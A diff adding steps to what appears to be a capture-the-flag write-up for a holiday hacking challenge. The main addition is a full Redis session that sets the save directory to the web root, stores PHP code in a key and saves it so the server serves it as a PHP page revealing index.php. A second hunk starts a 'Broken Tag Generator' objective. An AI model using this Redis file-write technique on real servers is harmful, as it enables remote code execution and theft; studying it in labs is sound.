@@ -96,6 +96,55 @@ masterauth
 ~~~
 - Step 5: "redis-cli"
 - Step 6: AUTH R3disp@ss
+- Step 7: Get php to show the contents of index.php by inserting into a key value.
+~~~
+127.0.0.1:6379> auth R3disp@ss
+OK
+127.0.0.1:6379> get test
+"foo"
+127.0.0.1:6379> config set dir /var/www/html
+OK
+127.0.0.1:6379> get dir
+"/var/www/html"
+127.0.0.1:6379> get dbfilename
+(nil)
+127.0.0.1:6379> set test "<?php $homepage = file_get_contents('index.php'); echo $homepage; ?>
+Invalid argument(s)
+127.0.0.1:6379> set test "<?php $homepage = file_get_contents('index.php'); echo $homepage; ?>"
+OK
+127.0.0.1:6379> get test
+"<?php $homepage = file_get_contents('index.php'); echo $homepage; ?>"
+127.0.0.1:6379> save
+OK
+127.0.0.1:6379> exit
+player@b71845abd4ae:~$ curl http://localhost/maintenance.php --output file
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   700  100   700    0     0   341k      0 --:--:-- --:--:-- --:--:--  341k
+player@b71845abd4ae:~$ ls                  
+file  maintenance.php
+player@b71845abd4ae:~$ cat file
+REDIS0009�      redis-ver5.0.3�
+�edis-bits�@�ctime���_used-mem�?
+/var/www/htmexample2#We think there's a bug in index.phexample1The site is in maintenance modetest@D<?php
+
+# We found the bug!!
+#
+#         \   /
+#         .\-/.
+#     /\ ()   ()
+#       \/~---~\.-~^-.
+# .-~^-./   |   \---.
+#      {    |    }   \
+#    .-~\   |   /~-.
+#   /    \  A  /    \
+#         \/ \/
+# 
+
+echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"
+?>
+~~~
+
 
 
 
@@ -490,6 +539,10 @@ It works!
 ## Objective 8: Broken Tag Generator
 
 Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.
+
+- Step 1: Get an error by doing and upload of an unsupported file:
+~~~
+Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201217-1-d0s4xy.txt~~~
 
 
 
